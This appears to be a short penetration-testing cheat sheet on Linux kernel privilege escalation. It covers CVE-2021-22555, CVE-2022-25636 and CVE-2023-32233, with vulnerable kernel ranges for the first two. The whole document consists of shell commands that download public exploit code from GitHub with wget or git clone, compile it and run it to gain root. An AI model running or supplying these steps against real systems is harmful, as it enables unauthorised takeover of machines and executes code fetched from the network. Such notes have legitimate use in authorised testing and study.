## CVE-2021-22555
Vulnerable kernel versions: 2.6 - 5.11

**Linux Kernel Version
```shell-session
uname -r
```

```shell-session
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit
./exploit
```

## CVE-2022-25636
Vulnerable kernel versions: 5.4 - 5.6.10

```shell-session
git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit
```

## CVE-2023-32233
```shell-session
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit
```
